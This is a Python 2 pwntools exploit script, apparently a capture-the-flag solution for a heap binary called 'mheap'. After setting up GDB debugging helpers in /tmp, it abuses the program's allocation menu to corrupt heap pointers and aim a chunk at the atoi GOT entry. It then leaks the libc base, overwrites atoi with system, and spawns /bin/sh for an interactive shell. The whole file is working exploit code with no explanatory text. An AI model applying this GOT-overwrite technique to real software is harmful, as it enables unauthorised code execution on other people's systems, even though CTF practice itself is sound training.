#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    typedef struct Link{
        int size;
        struct Link *next;
    }Link;
    Link no_use;
    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './mheap'
sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $l = 0x4040c0
    set $f = (Link **)0x4040d0

    def fs
        set $t = *$f
        while $t
            p $t
            p *$t
            set $t=$t->next

            end
        end

    def pr
        x/4gx $l
        x/4gx (0x4040E0)
        end

    b *0x4011EA
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def alloc(index, size, content):
    sh.sendlineafter(': ', '1')
    sh.sendlineafter('Index: ', str(index))
    sh.sendlineafter('size: ', str(size))
    sh.sendafter('Content: ', content)

def edit(index, content):
    sh.sendlineafter(': ', '4')
    sh.sendlineafter('Index: ', str(index))
    sh.send(content)

def delete(index):
    sh.sendlineafter(': ', '3')
    sh.sendlineafter('Index: ', str(index))

def show(index):
    sh.sendlineafter(': ', '2')
    sh.sendlineafter('Index: ', str(index))

alloc(0, 0xfc0, '\n')
alloc(1, 0x10, '\0' * 0x10)
delete(1)
alloc(2, 0x28, p64(0x4040d0) + '\0' * 0x1f + '\n')
alloc(3, 0x23330fd0 - 0x10, p64(elf.got['atoi']) + '\n')
show(0)
result = sh.recvuntil('\n', drop=True)
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['atoi']
log.success('libc_addr: ' + hex(libc_addr))
edit(0, p64(libc_addr + libc.symbols['system']) + '\n')
sh.sendline('/bin/sh\0')

sh.interactive()
clear()